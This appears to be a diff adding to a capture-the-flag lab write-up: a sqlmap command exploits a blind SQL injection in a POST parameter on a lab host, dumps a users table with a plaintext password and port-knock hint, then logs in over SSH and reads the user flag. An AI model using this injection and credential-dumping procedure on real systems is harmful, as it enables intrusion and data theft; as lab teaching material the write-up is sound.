@@ -548,3 +548,89 @@ Table: users
 
 [*] ending @ 04:16:42 /2026-05-06/
 ```
+
+```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ sqlmap -u "http://10.216.75.72/sl.php" \
+--method=POST \
+--data="query_id=1*" \
+--referer="http://10.216.75.72/secret.php" \
+-D forest_temple -T users \
+--dump \
+--technique=B \
+--no-cast \
+--text-only \
+--batch
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:17:22 /2026-05-06/
+
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[04:17:22] [INFO] resuming back-end DBMS 'mysql'
+[04:17:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: query_id=1' RLIKE (SELECT (CASE WHEN (4486=4486) THEN 1 ELSE 0x28 END))-- ccIA
+---
+[04:17:22] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL unknown (MariaDB fork)
+[04:17:22] [INFO] fetching columns for table 'users' in database 'forest_temple'
+[04:17:22] [INFO] resumed: 4
+[04:17:22] [INFO] resumed: id
+[04:17:22] [INFO] resumed: username
+[04:17:22] [INFO] resumed: password
+[04:17:22] [INFO] resumed: knock
+[04:17:22] [INFO] fetching entries for table 'users' in database 'forest_temple'
+[04:17:22] [INFO] fetching number of entries for table 'users' in database 'forest_temple'
+[04:17:22] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[04:17:22] [INFO] retrieved:
+[04:17:22] [WARNING] reflective value(s) found and filtering out
+1
+[04:17:22] [INFO] retrieved: 1
+[04:17:22] [INFO] retrieved: I have three loves: 7777, 8888, 9999
+[04:17:24] [INFO] retrieved: youareuser
+[04:17:24] [INFO] retrieved: bingren
+Database: forest_temple
+Table: users
+[1 entry]
++----+--------------------------------------+------------+----------+
+| id | knock                                | password   | username |
++----+--------------------------------------+------------+----------+
+| 1  | I have three loves: 7777, 8888, 9999 | youareuser | bingren  |
++----+--------------------------------------+------------+----------+
+
+[04:17:24] [INFO] table 'forest_temple.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.216.75.72/dump/forest_temple/users.csv'
+[04:17:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.216.75.72'
+[04:17:24] [WARNING] your sqlmap version is outdated
+```
+成功登录
+```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ ssh bingren@10.216.75.72
+bingren@10.216.75.72's password:
+Linux Open 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 21 00:22:31 2026 from 192.168.56.103
+bingren@Open:~$ cat user.txt
+flag{user-7e83921312384950a218f293a120c942}
+```
+`flag{user-7e83921312384950a218f293a120c942}`
+
